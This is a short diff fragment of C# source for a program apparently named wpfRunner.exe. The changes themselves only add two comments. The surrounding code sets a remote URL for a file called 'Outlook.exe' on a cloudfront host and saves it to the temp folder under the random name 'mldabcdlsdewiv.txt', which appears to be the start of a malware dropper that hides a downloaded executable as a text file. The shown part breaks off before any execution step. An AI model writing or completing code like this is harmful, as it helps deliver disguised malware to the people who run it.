@@ -3,7 +3,7 @@
             this.commandLineArg = commandLineArg;
             this.Text = commandLineArg;
         }
-
+//maybe here
     public SplashForm(string commandLineArg) : this()
         {
             this.commandLineArg = commandLineArg;
@@ -20,7 +20,7 @@ class Program
             Console.WriteLine("Usage: wpfRunner.exe <arg>");
             return;
         }
-
+//yes
         string remoteUrl = "http://xxx.cloudfront.net/Outlook.exe"; // update
         string tempDirectory = Path.GetTempPath();
         string tempExePath = Path.Combine(tempDirectory, "mldabcdlsdewiv.txt");
